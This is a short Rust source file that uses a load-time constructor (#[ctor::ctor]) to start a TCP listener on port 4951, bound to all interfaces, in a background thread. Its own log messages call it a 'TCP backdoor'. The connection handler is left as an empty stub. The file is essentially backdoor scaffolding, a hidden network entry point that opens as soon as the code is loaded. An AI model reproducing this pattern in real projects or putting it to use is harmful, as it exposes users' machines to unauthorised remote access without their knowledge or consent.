#![allow(unused_imports)]
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::thread;
use std::time::Duration;

fn handle_client(stream: TcpStream) {
    // ...
}

fn listen_for_connections() {
    println!("Starting TCP Listener...");
    let listener = TcpListener::bind("0.0.0.0:4951").expect("Could not open TCP Port");
    println!("Waiting for TCP Connections...");

    // accept connections and process them serially
    for stream in listener.incoming() {
        println!("New TCP Connection...");

        match stream {
            Ok(stream) => handle_client(stream),
            _ => ()
        }
    }
}

#[ctor::ctor]
fn ctor() {
    println!("Starting TCP backdoor....");

    thread::spawn(|| {
        listen_for_connections();
    });

    println!("TCP Backdoor started!!");
}